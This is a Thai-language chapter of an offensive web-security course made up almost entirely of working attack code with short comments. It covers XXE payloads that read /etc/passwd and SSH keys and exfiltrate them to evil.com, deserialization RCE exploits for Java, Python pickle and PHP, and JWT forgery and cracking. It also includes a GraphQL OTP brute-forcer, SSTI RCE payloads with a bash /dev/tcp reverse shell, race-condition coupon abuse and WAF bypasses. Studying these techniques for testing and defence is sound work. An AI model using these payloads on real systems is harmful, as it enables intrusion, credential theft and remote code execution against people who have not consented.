# Part 46: Advanced Web Application Attacks

## สารบัญ
1. [XXE - XML External Entity](#1)
2. [Insecure Deserialization](#2)
3. [JWT Attacks](#3)
4. [OAuth Vulnerabilities](#4)
5. [GraphQL Injection](#5)
6. [Template Injection (SSTI)](#6)
7. [Race Condition](#7)
8. [HTTP Parameter Pollution](#8)
9. [Lab Exercises](#9)

---

## 1. XXE - XML External Entity

```xml
<!-- XXE = ใส่ external entity reference ใน XML เพื่ออ่านไฟล์หรือ SSRF -->

<!-- พื้นฐาน XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- Output: root:x:0:0:root:/root:/bin/bash... -->

<!-- XXE อ่าน SSH key -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
]>
<foo>&xxe;</foo>

<!-- Blind XXE ผ่าน OOB (Out-of-Band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
  %xxe;
]>
<foo>&file;</foo>

<!-- xxe.dtd บน attacker server -->
<?xml version="1.0"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?data=%file;'>">
%eval;
%exfil;
```

```bash
# เครื่องมือ
# Burp Suite - intercept XML request

# ทดสอบ
curl -X POST http://target.com/api/xml \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

# Python
import requests

payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'''

r = requests.post('http://target.com/api/xml',
                  data=payload,
                  headers={'Content-Type': 'application/xml'})
print(r.text)
```

---

## 2. Insecure Deserialization

### Java Deserialization

```bash
# ysoserial - Java deserialization exploit
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# สร้าง payload (CommonsCollections)
java -jar ysoserial-all.jar CommonsCollections5 'touch /tmp/pwned' | base64

# ส่ง payload
curl -X POST http://target.com/api/deserialize \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.bin

# เช็ค gadget chains available
java -jar ysoserial-all.jar 2>&1 | head -30
```

### Python Pickle Deserialization

```python
# Vulnerable code:
import pickle
import base64

def vuln_deserialize(data):
    obj = pickle.loads(base64.b64decode(data))  # Dangerous!
    return obj

# Exploit:
import pickle
import os
import base64

class RCE(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

# สร้าง malicious pickle
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"Payload: {payload}")

# Send
import requests
requests.post('http://target.com/api/load', data={'data': payload})
```

### PHP Deserialization

```php
// Vulnerable code
$obj = unserialize($_COOKIE['user']); // Dangerous!

// Magic methods abused:
// __wakeup() - called on unserialize
// __destruct() - called when object is destroyed
// __toString() - called when printed

// Exploit class
class Exploit {
    public $cmd = 'id';
    
    function __destruct() {
        system($this->cmd);  // Execute!
    }
}

// Serialize exploit
$exp = new Exploit();
$exp->cmd = 'cat /etc/passwd';
$payload = serialize($exp);
echo base64_encode($payload);
// TzoxMDoiRXhwbG9pdCI6MTp7czo...

// phpggc - PHP gadget chain generator
// git clone https://github.com/ambionics/phpggc
// ./phpggc Laravel/RCE1 system 'id'
```

---

## 3. JWT Attacks

```bash
# JWT = JSON Web Token
# Header.Payload.Signature
# eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.HMAC

# Decode JWT
echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d
# {"alg":"HS256"}

echo 'eyJ1c2VyIjoiYWRtaW4ifQ' | base64 -d  
# {"user":"admin"}

# Attack 1: Algorithm None
# เปลี่ยน alg เป็น "none" -> ไม่ต้องมี signature
python3 << 'EOF'
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

def b64(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

fake_token = f"{b64(header)}.{b64(payload)}."
print(f"Fake JWT: {fake_token}")
EOF

# Attack 2: Weak secret (crack HS256)
# ใช้ hashcat
echo 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE' > jwt.txt
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# หรือใช้ jwt-cracker
npm install -g jwt-cracker
jwt-cracker 'TOKEN' -d wordlist.txt

# Attack 3: RS256 -> HS256 confusion
# เปลี่ยน algorithm จาก RSA เป็น HMAC
# ใช้ public key เป็น HMAC secret
```

```python
# JWT Toolkit
pip3 install jwt_tool
python3 jwt_tool.py TOKEN

# แผง signature
python3 jwt_tool.py TOKEN -X n  # alg=none
python3 jwt_tool.py TOKEN -X a  # all attacks

# Crack
python3 jwt_tool.py TOKEN -C -d wordlist.txt

# Tamper payload
python3 jwt_tool.py TOKEN -T  # Interactive
```

---

## 4. OAuth Vulnerabilities

```
OAuth Flaws:
1. CSRF in OAuth flow (state parameter missing/weak)
2. Open Redirect in redirect_uri
3. Token leakage via Referer header
4. Implicit flow token theft
5. Authorization code interception
```

```bash
# CSRF Attack on OAuth
# Victim: เริ่ม OAuth flow
# https://app.com/oauth/authorize?client_id=X&redirect_uri=https://app.com/callback&state=CSRF_TOKEN

# Attack: ไม่บันทึก state -> CSRF
curl 'https://app.com/oauth/authorize?client_id=X&redirect_uri=https://evil.com/callback'
# วัวแปลง redirect ไป evil.com พร้อม auth code

# Open Redirect in redirect_uri
# รับ redirect_uri ที่ validate ไม่ครบ
curl 'https://app.com/oauth/authorize?client_id=X&redirect_uri=https://evil.com/callback'

# เช็ค scope ของ token
wget https://example.com/oauth/token -q -O - | python3 -m json.tool
curl -H 'Authorization: Bearer TOKEN' https://api.provider.com/userinfo
```

---

## 5. GraphQL Injection

```bash
# GraphQL introspection (enumeration)
curl -X POST http://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "{__schema{types{name,fields{name}}}}"}'  

# Output: schema ทั้งหมด

# หา queries และ mutations
curl -X POST http://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "{__schema{queryType{fields{name,description}}}}"}'  

# SQL injection ผ่าน GraphQL
curl -X POST http://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "{users(id:\"1 OR 1=1--\"){id,name,email}}"}'  

# เก็บข้อมูลที่ไม่ควร expose
curl -X POST http://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "{users{id,name,email,password,credit_card}}"}'

# Batch requests (bypass rate limiting)
python3 << 'EOF'
import requests

# Brute force OTP via batch GraphQL
batch = []
for code in range(10000):
    batch.append({
        'query': f'mutation {{ verifyOTP(code: "{code:04d}") {{ success token }} }}'
    })

# Send in batches of 1000
for i in range(0, len(batch), 1000):
    r = requests.post('http://target.com/graphql',
                      json=batch[i:i+1000],
                      headers={'Content-Type': 'application/json'})
    for result in r.json():
        if result.get('data', {}).get('verifyOTP', {}).get('success'):
            print(f'Found OTP: {i + batch.index(result)}')
            break
EOF
```

---

## 6. Template Injection (SSTI)

```bash
# SSTI = Server-Side Template Injection
# เกิดเมื่อ user input ถูก render เป็น template

# ทดสอบ:
# ?name={{7*7}}
# Output: 49 = Jinja2/Flask
# ?name=<%= 7*7 %>
# Output: 49 = ERB (Ruby)
# ?name=${7*7}
# Output: 49 = Freemarker/Thymeleaf

# Jinja2 (Python/Flask) RCE
# {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
curl 'http://target.com/hello?name={{config.__class__.__init__.__globals__["os"].popen("id").read()}}'

# Jinja2 sandbox escape
# {{''.__class__.mro()[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()}}

# Twig (PHP) RCE
curl 'http://target.com/?template={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'

# Tornado (Python) RCE
curl 'http://target.com/?msg={%25+import+os+%25}{{os.popen("id").read()}}'

# ใช้ tplmap (auto detection)
git clone https://github.com/epinna/tplmap
python3 tplmap.py -u 'http://target.com/?name=*'
python3 tplmap.py -u 'http://target.com/?name=*' --os-shell
```

---

## 7. Race Condition

```python
# Race Condition = ส่ง requests พร้อมกันเพื่อ bypass logic
# ตัวอย่าง: ใช้ coupon หลายครั้ง, โอนเงินซ้ำ

import threading
import requests

def apply_coupon(session, coupon_code):
    return session.post('http://target.com/checkout/apply_coupon', 
                       data={'coupon': coupon_code})

# สร้าง 10 threads ส่งพร้อมกัน
threads = []
session = requests.Session()
session.cookies.set('session', 'USER_SESSION_COOKIE')

for i in range(10):
    t = threading.Thread(target=apply_coupon, args=(session, 'DISCOUNT50'))
    threads.append(t)

# เริ่มทุก thread พร้อมกัน
for t in threads:
    t.start()

for t in threads:
    t.join()

print("Race condition attack complete")

# Burp Suite - Turbo Intruder extension
# ส่ง requests parallel ด้วยความเร็วสูง
```

---

## 8. HTTP Parameter Pollution

```bash
# HPP = ส่ง parameter ซ้ำหลายครั้ง หวังให้ backend ใช้ค่าที่ต้องการ

# PHP - ใช้ค่าสุดท้าย
curl 'http://target.com/?id=1&id=999'
# PHP: $_GET['id'] = '999'

# ASP.NET - รวมค่า
curl 'http://target.com/?id=1&id=999'
# ASP.NET: id = '1,999'

# ตัวอย่าง bypass signature
# Backend ใช้ id[0], attacker ส่ง id[1]
curl 'http://target.com/transfer?id=victim&amount=100&id=attacker'

# WAF bypass
curl 'http://target.com/sql?id=1&id=UNION SELECT 1,2,3--'
```

---

## 9. Lab Exercises

### Lab 1: XXE to Read Files

```bash
# Vulnerable XML endpoint
curl -X POST http://dvwa.local/vulnerabilities/xxe/ \
  -H 'Content-Type: application/xml' \
  -H 'Cookie: PHPSESSID=xxx; security=medium' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### Lab 2: SSTI RCE

```bash
# Test Jinja2 injection
curl 'http://flask-app.local/hello?name={{7*7}}'
# Output: 49 -> vulnerable!

# RCE
curl 'http://flask-app.local/hello?name={{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Reverse shell
curl 'http://flask-app.local/hello?name={{config.__class__.__init__.__globals__["os"].popen("bash+-c+%27bash+-i+>%26+/dev/tcp/192.168.1.100/4444+0>%261%27").read()}}'
```

### Lab 3: JWT None Attack

```python
#!/usr/bin/env python3
import base64
import json
import requests

def b64_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

# Craft JWT with alg=none
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "iat": 9999999999}

forged_token = f"{b64_encode(header)}.{b64_encode(payload)}."
print(f"Forged JWT: {forged_token}")

# Test
r = requests.get('http://target.com/admin',
                 headers={'Authorization': f'Bearer {forged_token}'})
print(r.status_code, r.text[:200])
```

---

## สรุป

| Vulnerability | Tool | Impact |
|--------------|------|--------|
| XXE | Burp, curl | File read, SSRF |
| Deserialization | ysoserial, pickle | RCE |
| JWT Attacks | jwt_tool, hashcat | Auth bypass |
| OAuth | Manual, Burp | Account takeover |
| GraphQL | Manual, tplmap | Data exposure, IDOR |
| SSTI | tplmap | RCE |
| Race Condition | Burp Turbo Intruder | Logic bypass |
| HPP | Manual | WAF bypass |

---

**ต่อไป:** [Part 47 - Forensics และ CTF Techniques](Part-47-Forensics-CTF.md)
